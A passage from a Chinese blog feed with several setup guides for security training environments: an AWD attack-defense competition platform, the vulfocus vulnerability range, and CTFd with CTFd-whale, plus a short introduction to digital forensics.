<p>注意第18行<code>dos2unix /flag.sh</code>，个人习惯在windows上出题，写的shell脚本的换行符在linux系统中会炸，因此需要执行该命令。当然也可以使用编辑器，例如notepad++或sublime text中设置文件为unix格式。</p>
<h2 id="有数据库篇"><a href="#有数据库篇" class="headerlink" title="有数据库篇"></a>有数据库篇</h2><p>正在学习，玩不明白数据库，蕾姆。之后看情况更新密码nc题出题方法。</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>ctf出题指南</tag>
      </tags>
  </entry>
  <entry>
    <title>基于AWD-platform的AWD环境搭建</title>
    <url>/2021/09/27/%E5%9F%BA%E4%BA%8EAWD-platform%E7%9A%84AWD%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="基于AWD-platform的AWD环境搭建"><a href="#基于AWD-platform的AWD环境搭建" class="headerlink" title="基于AWD-platform的AWD环境搭建"></a>基于AWD-platform的AWD环境搭建</h1><p>用zhl2008大佬的平台搭了个AWD平台，下面记录搭建过程和运维指南。</p>
<span id="more"></span>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247486325&amp;idx=1&amp;sn=96c04f3609a04260eabdd187fc7c38b1&amp;chksm=fbf79105cc8018131579ad228dbf22a33bbdf0c8c71d3b8c090583b42ea21d80de53fc1efa70&amp;scene=27&amp;key=593393174013ce6d958e86eb764289b105cb7cea44d471bd3f9fe1a2ed76f546343dacb9b40a352e642e425b55c2a4d9698146a114ecd9680ed3262c8f96f6a206f0c78d6818ce0028c9bc75830936f0&amp;ascene=7&amp;uin=NTQ5ODg5NzY1&amp;devicetype=Windows+10&amp;version=6206061c&amp;lang=zh_CN&amp;pass_ticket=s3n8uD0SG7m1vojw%2F%2BN7uxdrTxvWnumzuUe%2BTLY12QY9yFKjU7n%2FNruWi9PS1sJO&amp;winzoom=1">夜莫离大佬的教程</a></p>
<p><a href="https://blog.csdn.net/huanghelouzi/article/details/90204325">搭建CTF-AWD训练平台</a></p>
<p><a href="https://www.moonsec.com/archives/2980">暗月博客搭建AWD平台</a></p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://gitee.com/jikemofan/awd-platform</span><br></pre></td></tr></table></figure>
<p>原版有无限提交flag的bug，我用的暗月的版本，主要bug均已经修复。（但是有新的bug，比如说他写的提交flag功能是个摆设）</p>
<p>进入项目：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd awd-platform/</span><br></pre></td></tr></table></figure>
<p>从网上拉取一下zhl2008的docker镜像：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull zhl2008&#x2F;web_14.04</span><br></pre></td></tr></table></figure>
<p>然后要改名！大坑。不改名就去改dockerfile</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker tag zhl2008&#x2F;web_14.04 web_14.04</span><br></pre></td></tr></table></figure>
<p>至此，awd平台已经安装完毕。但是，要安装python2，先更新源：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>
<p>然后装python2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install python2</span><br></pre></td></tr></table></figure>
<h2 id="比赛环境介绍"><a href="#比赛环境介绍" class="headerlink" title="比赛环境介绍"></a>比赛环境介绍</h2><p>服务器全部以docker形式部署在同一台虚拟机上。</p>
<p>Check_server:</p>
<p>服务检查服务器，用于判定选手维护的服务是否可用，如果不可用，则会扣除相应的分数。不开启任何端口。需要与flag服务器通信。</p>
<p>Flag_server:</p>
<p>选手提交flag的服务器，并存储选手的分数。开启80端口。</p>
<p>Web_server:</p>
<p>选手连接的服务器，选手需要对其进行维护，并尝试攻击其他队伍的机器。通常开启80端口，22端口，并将端口映射到主机。</p>
<h2 id="比赛逻辑拓扑"><a href="#比赛逻辑拓扑" class="headerlink" title="比赛逻辑拓扑"></a>比赛逻辑拓扑</h2><p><img src="https://i.loli.net/2021/09/27/nGrJePfA3XVLFgl.png" alt="7-1"></p>
<h2 id="比赛启动"><a href="#比赛启动" class="headerlink" title="比赛启动"></a>比赛启动</h2><p>例如我要创建5支队伍，赛题使用<code>web_yunnan_simple</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python2 batch.py web_yunnan_simple 5</span><br></pre></td></tr></table></figure>
<p>启动比赛：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python2 start.py ./ 5</span><br></pre></td></tr></table></figure>
<p>此时可以访问8080端口看到计分板。靶机也可以正常访问。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">映射规则:</span><br><span class="line">站的位置:</span><br><span class="line">team1 ---- 8801</span><br><span class="line">team2 ---- 8802</span><br><span class="line">team3 ---- 8803</span><br><span class="line">SSH位置:</span><br><span class="line">team1 ---- 2201</span><br><span class="line">team2 ---- 2202</span><br><span class="line">team3 ---- 2203</span><br></pre></td></tr></table></figure>
<p>各队伍的ssh密码在pass.txt中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat pass.txt</span><br></pre></td></tr></table></figure>
<p>关于check模块，他的check脚本是不能用的，我们需要进行一些修改，这个规则要根据自己的环镜自己编写，总体思路就是判断页面是否存在，存在就加一分，不存在就减一分，在他内置check脚本的基础上，我们可以稍微修改一下靶机环境的源码，然后用check脚本去访问，在他内置的脚本中还可以修改每次加分和扣分的多少。</p>
<p><img src="https://i.loli.net/2021/09/27/CyfMQIl7Sab8qci.png" alt="image-20210927210321320"></p>
<p>还有一个要注意的地方就是，在项目的根目录的flag_server/中，我们 要赋予score.txt 和result.txt 777权限，否则分数变动无法进行同步。</p>
<p>关闭环境和题目：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 stop_clean.py</span><br></pre></td></tr></table></figure>
<h2 id="比赛参数"><a href="#比赛参数" class="headerlink" title="比赛参数"></a>比赛参数</h2><p>Flag 提交： /flag_file.php?token=teamx&amp;flag=xxxx (x为你们的队伍号)</p>
<h2 id="比赛规则"><a href="#比赛规则" class="headerlink" title="比赛规则"></a>比赛规则</h2><p>1.每个队伍分配到一个docker主机，给定ctf用户权限，通过制定的端口和密码进行连接；</p>
<p>2.每台docker主机上运行一个web服务或者其他的服务，需要选手保证其可用性，并尝试审计代码，攻击其他队伍；</p>
<p>3.比赛开始后，<strong>前30分钟</strong>，选手维护各自的主机，在这个阶段，所有的攻击和服务不可用不影响分数；</p>
<p>4.选手可以通过使用漏洞获取其他队伍的服务器的权限，读取他人服务器上的flag并提交到指定的flag服务器：</p>
<p><a href="http://flag服务器IP:端口/flag_file.php?token=队伍token&amp;flag=获取到的flag">http://flag服务器IP:端口/flag_file.php?token=队伍token&amp;flag=获取到的flag</a>   来获得相应的分数。</p>
<p>例如：flag server地址为8.8.8.8，端口为8080，队伍token为team1，flag为40ed892b93997142e46124516d0f5ac0，则请求/flag_file.php?token=team1&amp;flag=40ed892b93997142e46124516d0f5ac0来获得相应分数。</p>
<p>每次成功攻击可获得<strong>2</strong>分，被攻击者扣除2分；<strong>有效攻击两分钟一轮</strong>；</p>
<p>5.选手需要保证己方服务的可用性，每次服务不可用，扣除1分,服务可用，加1分；<strong>服务检测两分钟一轮</strong>；</p>
<p>6.选手可以从flag服务器上获取所有的攻击情况以及当前的分数：</p>
<p>攻击情况url地址：<a href="http://flag服务器IP:端口/result.txt">http://flag服务器IP:端口/result.txt</a></p>
<p>得分情况地址：<a href="http://flag服务器IP:端口/score.txt">http://flag服务器IP:端口/score.txt</a></p>
<p>7.<strong>不允许使用任何形式的DOS攻击</strong></p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>比赛节奏巨快，2分钟一轮。要修改的话可以看看这个（但我没有成功）</p>
<p><img src="https://i.loli.net/2021/09/27/nZEoyXMVL8duckT.png" alt="image-20210927210717817"></p>
<p>还有夜莫离大佬写的前端计分板。</p>
<p><img src="https://i.loli.net/2021/09/27/f6mapx42HyUhjzq.png" alt="image-20210927210806037"></p>
<p>计分板源码打包：<a href="https://pan.baidu.com/s/18KlIeluaTtm-kT3KuXHseQ">https://pan.baidu.com/s/18KlIeluaTtm-kT3KuXHseQ</a></p>
<p>提取码：cvdn</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>AWD环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>vulfocus靶场搭建及bug处理</title>
    <url>/2021/09/27/vulforce%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E5%8F%8Abug%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<h1 id="vulfocus搭建"><a href="#vulfocus搭建" class="headerlink" title="vulfocus搭建"></a>vulfocus搭建</h1><p>想复现漏洞，但是漏洞复现需要大家一起交流一起学习，就想到搭一个漏洞复现靶场。</p>
<span id="more"></span>
<p>首先贴上<a href="https://fofapro.github.io/vulfocus/#/">官方链接</a>：</p>
<p>推荐采用快速安装。自定义安装极其繁琐，把握不住。</p>
<h2 id="安装流程："><a href="#安装流程：" class="headerlink" title="安装流程："></a>安装流程：</h2><h3 id="拉取镜像："><a href="#拉取镜像：" class="headerlink" title="拉取镜像："></a>拉取镜像：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull vulfocus&#x2F;vulfocus:latest</span><br></pre></td></tr></table></figure>
<h3 id="启动："><a href="#启动：" class="headerlink" title="启动："></a>启动：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 80:80 -v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock  -e VUL_IP&#x3D;xxx.xxx.xxx.xxx&quot; vulfocus&#x2F;vulfocus</span><br></pre></td></tr></table></figure>
<p>因为内网使用，就不开邮箱权限了。</p>
<p>贴上官网教程。</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531690363-b2effeed-c6ce-4c2e-bfcb-067c59e6b224.png" alt="image-20210927200624470"></p>
<h2 id="bug处理"><a href="#bug处理" class="headerlink" title="bug处理"></a>bug处理</h2><h3 id="1、服务器内部异常，请联系管理员"><a href="#1、服务器内部异常，请联系管理员" class="headerlink" title="1、服务器内部异常，请联系管理员"></a>1、服务器内部异常，请联系管理员</h3><p>巨大bug，在拉取镜像后，点击首页会报这个错误，解决方式为进入镜像管理，点击右上角一键同步，即可。</p>
<h3 id="2、忘了长啥样，但是进去就得处理"><a href="#2、忘了长啥样，但是进去就得处理" class="headerlink" title="2、忘了长啥样，但是进去就得处理"></a>2、忘了长啥样，但是进去就得处理</h3><p>点击设置-系统设置，在分享一栏输入自己的github账号名。然后镜像没事别乱点分享，即可。</p>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>靶场环境很大很大！之前随便下了10个靶场就占了将近10G的内存！合理分配好内存！</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>vulfocus搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>零基础入门电子数据取证</title>
    <url>/2021/08/28/%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/</url>
    <content><![CDATA[<h1 id="零基础入门电子数据取证"><a href="#零基础入门电子数据取证" class="headerlink" title="零基础入门电子数据取证"></a>零基础入门电子数据取证</h1><span id="more"></span>
<h2 id="电子数据基础"><a href="#电子数据基础" class="headerlink" title="电子数据基础"></a>电子数据基础</h2><h3 id="什么是电子数据"><a href="#什么是电子数据" class="headerlink" title="什么是电子数据"></a>什么是电子数据</h3><p>电子数据可以是人为生成、自动生成或者两者结合下生成的。</p>
<p>人为生成的电子数据是以用户的主观意志创造、复制或者衍生出的新数据，使用户主动创造的痕迹，一般不会特意清除。比如使用邮件客户端收发的邮件、通过下载工具下载资料等。</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531728693-3863cf8a-1d5d-4f1c-87fe-872f89b37357.png" alt="image-20210828082739631"></p>
<p><img src="D:\study\blog\source\_posts\零基础入门电子数据取证\rw3tcqXW7zjZ8H4.png" alt="image-20210828082755764"></p>
<p>自动生成的电子数据是操作系统或者应用系统自动生成的记录一定信息的数据，不被用户的主观意志左右。通常这些数据是从系统启动开始，在用户不经意间不断产生的，而且会在用户的使用过程中随时变化，比如操作系统的开关机时间、USB设备的插拔记录、通过浏览器上网产生的缓存记录等。</p>
<h3 id="用户痕迹的特点"><a href="#用户痕迹的特点" class="headerlink" title="用户痕迹的特点"></a>用户痕迹的特点</h3><p>人为、自动和两者结合的方式产生的用户痕迹数据贯穿了使用计算机等设备的整个过程，也使得第三方调查者能够通过调查这些痕迹数据对嫌疑人进行用户行为串联和分析，从而给还原案件的真相提供了可能。</p>
<p>用户痕迹电子数据具备着电子数据的普遍特点：无形性、多样性、客观性、易破坏性、隐蔽性等。</p>
<p>由于痕迹产生于用户使用计算机等设备的过程中，因此还具备着记录用户操作历史、行为轨迹、通信记录、密码信息等隐私数据的特点。</p>
<h2 id="电子数据与电子数据取证"><a href="#电子数据与电子数据取证" class="headerlink" title="电子数据与电子数据取证"></a>电子数据与电子数据取证</h2>]]></content>
  </entry>
  <entry>
    <title>C语言学习笔记</title>
    <url>/2021/07/25/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 密码不对呢，为什么不去社工管理员呢？" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="02c44a61c7098542a720ee37d99d397a007003ab382bd35646b6f8363970eb0b"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好,接下来的内容需要密码才能阅览。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>基础课程学习</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFd+CTFd-whale安装教程</title>
    <url>/2021/07/11/CTFd+CTFd-whale%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="动态靶机CTF靶场平台搭建"><a href="#动态靶机CTF靶场平台搭建" class="headerlink" title="动态靶机CTF靶场平台搭建"></a>动态靶机CTF靶场平台搭建</h1><p>闲来无事，嫖了阿里云2个月试用机搭了一个训练靶场，在此记录详细过程。对应的是赵总博客的第一种模式：单机 Direct 模式</p>
<span id="more"></span>
<h2 id="换源-虚拟机调配时使用"><a href="#换源-虚拟机调配时使用" class="headerlink" title="换源(虚拟机调配时使用)"></a>换源(虚拟机调配时使用)</h2><p>Ubuntu系统中，软件源文件地址为：<code>/etc/apt/sources.list</code></p>
<p>1.备份原来的源，将以前的源备份一下，以防以后可以用的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure>
<p>2.打开<code>/etc/apt/sources.list</code>文件，在前面添加如下条目，并保存。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">#添加阿里源s</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">#添加清华源</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse multiverse</span><br></pre></td></tr></table></figure>
<p>3.更新</p>
<p>更新源</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
<p>如出现依赖问题，解决方式如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sudo apt-get -f install</span><br></pre></td></tr></table></figure>
<p>更新软件：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure>
<p>参考链接：<a href="https://zhuanlan.zhihu.com/p/142014944">Ubuntu20.04软件源更换</a></p>
<h2 id="安装Docker和Docker-Compose"><a href="#安装Docker和Docker-Compose" class="headerlink" title="安装Docker和Docker Compose"></a>安装Docker和Docker Compose</h2><p>本部分内容完全参考：<a href="https://hujiekang.top/2020/04/26/CTFd-conf/">CTFd平台搭建记录</a></p>
<h3 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h3><p>Docker使用阿里云镜像源安装：</p>
<p><a href="https://docs.docker.com/engine/install/ubuntu/">Ubuntu安装docker官网</a></p>
<h4 id="卸载老版本Docker："><a href="#卸载老版本Docker：" class="headerlink" title="卸载老版本Docker："></a>卸载老版本Docker：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure>
<h4 id="更新软件"><a href="#更新软件" class="headerlink" title="更新软件"></a>更新软件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
<h4 id="安装软件包"><a href="#安装软件包" class="headerlink" title="安装软件包"></a>安装软件包</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</span><br></pre></td></tr></table></figure>
<h4 id="添加GPG密钥"><a href="#添加GPG密钥" class="headerlink" title="添加GPG密钥"></a>添加GPG密钥</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>
<h4 id="查看密钥是否添加成功"><a href="#查看密钥是否添加成功" class="headerlink" title="查看密钥是否添加成功"></a>查看密钥是否添加成功</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-key fingerprint 0EBFCD88</span><br></pre></td></tr></table></figure>
<p>若添加成功，会显示如下信息：</p>
<p><img src="https://i.loli.net/2021/07/22/sPKywfbAjIpiHJS.png" alt="img"></p>
<h4 id="添加阿里云的软件源"><a href="#添加阿里云的软件源" class="headerlink" title="添加阿里云的软件源"></a>添加阿里云的软件源</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository &quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;</span><br></pre></td></tr></table></figure>
<p>若添加成功，则在<code>/etc/apt/sources.list</code>中可看见类似如下的记录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb [arch&#x3D;amd64] http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu bionic stable</span><br></pre></td></tr></table></figure>
<h4 id="再次更新软件"><a href="#再次更新软件" class="headerlink" title="再次更新软件"></a>再次更新软件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
<h4 id="安装最新版的docker-ce"><a href="#安装最新版的docker-ce" class="headerlink" title="安装最新版的docker-ce"></a>安装最新版的docker-ce</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>
<p>安装完毕之后，通过<code>docker --version</code>来验证安装是否成功：</p>
<p><img src="https://hujiekang.top/images/uploads/big/bbdd287fc77a316f10f8e52c39c47da9.png" alt="img"></p>
<h4 id="启动Docker服务并设置为开机启动"><a href="#启动Docker服务并设置为开机启动" class="headerlink" title="启动Docker服务并设置为开机启动"></a>启动Docker服务并设置为开机启动</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl start docker</span><br><span class="line">sudo systemctl enable docker</span><br></pre></td></tr></table></figure>
<h4 id="然后为Docker添加镜像加速"><a href="#然后为Docker添加镜像加速" class="headerlink" title="然后为Docker添加镜像加速"></a>然后为Docker添加镜像加速</h4><p>修改<code>/etc/docker/daemon.json</code>文件（若不存在则自行创建），加入如下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://hub-mirror.c.163.com/(地址)&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>里面更换为想要的镜像地址即可。下面有几个可选项：</p>
<blockquote>
<ul>
<li>阿里云容器镜像服务（使用自己的阿里云账户申请）：<a href="https://cr.console.aliyun.com/#/accelerator">https://cr.console.aliyun.com/#/accelerator</a></li>
<li>DaoCloud：<a href="https://www.daocloud.io/mirror">https://www.daocloud.io/mirror</a></li>
<li>网易：<a href="https://hub-mirror.c.163.com/">https://hub-mirror.c.163.com/</a></li>
</ul>
</blockquote>
<p>修改文件后，执行命令重启docker服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
<h3 id="安装Docker-compose"><a href="#安装Docker-compose" class="headerlink" title="安装Docker-compose"></a>安装Docker-compose</h3><p>接下来是安装Docker Compose。官方给的是从GitHub下载安装，依然速度很慢，所以采用DaoCloud的镜像源来安装。</p>
<h4 id="下载docker-compose"><a href="#下载docker-compose" class="headerlink" title="下载docker-compose"></a>下载docker-compose</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.5/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>
<h4 id="为其添加可执行权限"><a href="#为其添加可执行权限" class="headerlink" title="为其添加可执行权限"></a>为其添加可执行权限</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>
<h4 id="使用docker-compose-version验证安装："><a href="#使用docker-compose-version验证安装：" class="headerlink" title="使用docker-compose --version验证安装："></a>使用<code>docker-compose --version</code>验证安装：</h4><p><img src="https://hujiekang.top/images/uploads/big/5343f8893310644d336b9011120b39c2.png" alt="img"></p>
<h4 id="启用Docker-Swarm"><a href="#启用Docker-Swarm" class="headerlink" title="启用Docker Swarm"></a>启用Docker Swarm</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker swarm init  # 初始化</span><br><span class="line">docker node ls  # 查看节点ID</span><br><span class="line">docker node update --label-add name=linux-1 &lt;节点 ID&gt;  # 添加别名(一定要记住！)</span><br></pre></td></tr></table></figure>
<h2 id="安装CTFd-amp-CTFd-Whale"><a href="#安装CTFd-amp-CTFd-Whale" class="headerlink" title="安装CTFd&amp;CTFd-Whale"></a>安装CTFd&amp;CTFd-Whale</h2><h3 id="下载赵总仓库的CTFd源码"><a href="#下载赵总仓库的CTFd源码" class="headerlink" title="下载赵总仓库的CTFd源码"></a>下载赵总仓库的CTFd源码</h3><p>（是否需要回滚忘了。参考博主的版本为<strong><code>9d8981a9808078a0634b13e61190cec4556782e4</code></strong>，如有报错，可以回滚）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone -b single https://github.com/glzjin/CTFd.git</span><br><span class="line">cd CTFd</span><br></pre></td></tr></table></figure>
<h3 id="坑1："><a href="#坑1：" class="headerlink" title="坑1："></a>坑1：</h3><p>清华源将python2和python3分开来了，所以Dockerfile里要把python和python-dev改掉。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.7</span>-alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /opt/CTFd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir -p /opt/CTFd /var/<span class="built_in">log</span>/CTFd /var/uploads</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> sed -i <span class="string">&#x27;s/dl-cdn.alpinelinux.org/mirror.tuna.tsinghua.edu.cn/g&#x27;</span> /etc/apk/repositories &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apk update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apk add \</span></span><br><span class="line"><span class="bash">        python3 \</span></span><br><span class="line"><span class="bash">        python3-dev \</span></span><br><span class="line"><span class="bash">        linux-headers \</span></span><br><span class="line"><span class="bash">        libffi-dev \</span></span><br><span class="line"><span class="bash">        gcc \</span></span><br><span class="line"><span class="bash">        make \</span></span><br><span class="line"><span class="bash">        musl-dev \</span></span><br><span class="line"><span class="bash">        py-pip \</span></span><br><span class="line"><span class="bash">        mysql-client \</span></span><br><span class="line"><span class="bash">        git \</span></span><br><span class="line"><span class="bash">        openssl-dev</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> . /opt/CTFd</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip install -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com -r requirements.txt</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="keyword">for</span> d <span class="keyword">in</span> CTFd/plugins/*; <span class="keyword">do</span> \</span></span><br><span class="line"><span class="bash">      <span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$d</span>/requirements.txt&quot;</span> ]; <span class="keyword">then</span> \</span></span><br><span class="line"><span class="bash">        pip install -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com -r <span class="variable">$d</span>/requirements.txt; \</span></span><br><span class="line"><span class="bash">      <span class="keyword">fi</span>; \</span></span><br><span class="line"><span class="bash">    <span class="keyword">done</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod +x /opt/CTFd/docker-entrypoint.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> adduser -D -u 1001 -s /bin/sh ctfd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chown -R 1001:1001 /opt/CTFd /var/<span class="built_in">log</span>/CTFd /var/uploads</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> <span class="number">1001</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8000</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;/opt/CTFd/docker-entrypoint.sh&quot;</span>]</span></span><br></pre></td></tr></table></figure>
<h3 id="坑2："><a href="#坑2：" class="headerlink" title="坑2："></a>坑2：</h3><p>requirements.txt少装了一个库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">greenlet&#x3D;&#x3D;0.4.15</span><br></pre></td></tr></table></figure>
<h3 id="配置Frp-Token"><a href="#配置Frp-Token" class="headerlink" title="配置Frp Token"></a>配置Frp Token</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim frp/frps.ini</span><br></pre></td></tr></table></figure>
<p> frps.ini</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 6490</span><br><span class="line">token &#x3D; randomme</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim frp&#x2F;frpc.ini</span><br></pre></td></tr></table></figure>
